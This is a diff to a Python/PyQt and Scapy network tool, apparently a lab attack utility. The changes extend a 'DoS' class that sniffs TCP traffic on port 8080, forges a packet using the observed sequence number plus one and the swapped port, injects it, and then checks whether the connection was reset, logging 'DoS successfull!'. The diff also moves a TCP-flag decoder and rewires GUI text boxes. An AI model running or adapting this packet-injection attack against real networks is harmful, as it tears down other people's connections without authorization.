@@ -20,6 +20,26 @@ URG = 0x20
 ECE = 0x40
 CWR = 0x80
 
+def getFlags(F):
+    f = []
+    if F & FIN:
+        f.append('FIN')
+    if F & SYN:
+        f.append('SYN')
+    if F & RST:
+        f.append('RST')
+    if F & PSH:
+        f.append('PSH')
+    if F & ACK:
+        f.append('ACK')
+    if F & URG:
+        f.append('URG')
+    if F & ECE:
+        f.append('ECE')
+    if F & CWR:
+        f.append('CWR')
+    return f
+
 class DoS(QThread):
     def __init__(self):
         QThread.__init__(self)
@@ -28,10 +48,13 @@ class DoS(QThread):
     def __del__(self):
         self.wait()
 
-    def setTextBox(self, textBox):
-        self.textBox = textBox
+    def setTextBox(self, log_textBox, original_textBox, new_textBox):
+        self.log_textBox = log_textBox
+        self.original_textBox = original_textBox
+        self.new_textBox = new_textBox
 
     def inj(self, pacote, pkt):
+        self.original_textBox.setText("Trigged packet:\n src IP: "+ pkt[IP].src + "\n dst IP: " + pkt[IP].dst + "\n ACK: " + str(pkt[TCP].ack) + "\n SEQ: " + str(pkt[TCP].seq) + "\n flags: " + str(getFlags(pkt[TCP].flags)))
         pacote[TCP].dport = pkt[TCP].sport
         pacote[TCP].ack = pkt[TCP].seq + 1
         del pacote[IP].chksum
@@ -39,8 +62,14 @@ class DoS(QThread):
         #pacote.show2()
         #for i in range(0, 15):
         sendp(pacote, iface="virbr0")
-        self.textBox.appendText("\nDoS done")
-
+        self.new_textBox.setText("Trigged packet:\n src IP: "+ pacote[IP].src + "\n dst IP: " + pacote[IP].dst + "\n ACK: " + str(pacote[TCP].ack) + "\n SEQ: " + str(pacote[TCP].seq) + "\n flags: " + str(getFlags(pacote[TCP].flags)))
+        sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 2)
+        print(str(getFlags(sniffing[0][TCP].flags)))
+        flags = str(getFlags(sniffing[1][TCP].flags))
+        if 'RST' in flags:
+            self.log_textBox.appendText("\nDoS successfull!\n")
+        else:
+            self.log_textBox.appendText("\nDoS failed.\n")
 
     def attack_dos(self):
         pacote = Ether()/IP()/TCP()
@@ -68,7 +97,8 @@ class DoS(QThread):
         #pacote[TCP].chksum=0x274a
         pacote[TCP].options={}
 
-        sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 1, prn=lambda x: self.inj(pacote, x))
+        sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 1)
+        self.inj(pacote, sniffing[0])
 
     def run(self):
         self.attack_dos()
@@ -94,26 +124,6 @@ class Sniffer(QThread):
     def setRestart(self):
         self.restart = True
 
-    def getFlags(self, F):
-        f = []
-        if F & FIN:
-            f.append('FIN')
-        if F & SYN:
-            f.append('SYN')
-        if F & RST:
-            f.append('RST')
-        if F & PSH:
-            f.append('PSH')
-        if F & ACK:
-            f.append('ACK')
-        if F & URG:
-            f.append('URG')
-        if F & ECE:
-            f.append('ECE')
-        if F & CWR:
-            f.append('CWR')
-        return f
-
     def capture(self):
         s = sniff(filter=self.filter, prn=lambda packet: self.unpack(packet))
 
@@ -124,7 +134,7 @@ class Sniffer(QThread):
             sport = packet[TCP].sport
             dport = packet[TCP].dport
             flags = packet[TCP].flags
-            flags = self.getFlags(flags)
+            flags = getFlags(flags)
             if 'PSH' in flags:
                 if sport == 443 or dport == 443 or sport == 22 or dport == 22:
                     raw = "Encrypted payload (" + str(sys.getsizeof(packet[Raw].load)) + " bytes)"
@@ -183,15 +193,12 @@ class TextBox(QPlainTextEdit):
         return self.text
 
     def updateText(self):
-        print("updateText")
         self.setPlainText(self.text)
 
 class MainWindow(QWidget):
     def __init__(self):
         super(MainWindow, self).__init__()
 
-    def updateUi(self):
-        print('sdasd')
 
 if __name__ == "__main__":
 
@@ -301,15 +308,17 @@ if __name__ == "__main__":
     text_original = TextBox()
     text_original.setEnabled(False)
     grid.addWidget(text_original, 6, 1)
+    w.connect(dos, SIGNAL("finished()"), text_original.updateText)
 
     # new payload
     new_label = QLabel('New payload:')
     grid.addWidget(new_label, 5, 2)
-    text_new = QPlainTextEdit()
-    text_new.setReadOnly(True)
+    text_new = TextBox()
+    text_new.setEnabled(False)
     grid.addWidget(text_new, 6, 2)
+    w.connect(dos, SIGNAL("finished()"), text_new.updateText)
 
-    dos.setTextBox(text_log)
+    dos.setTextBox(text_log, text_original, text_new)
 
     # Show the window and run the app
     w.show()
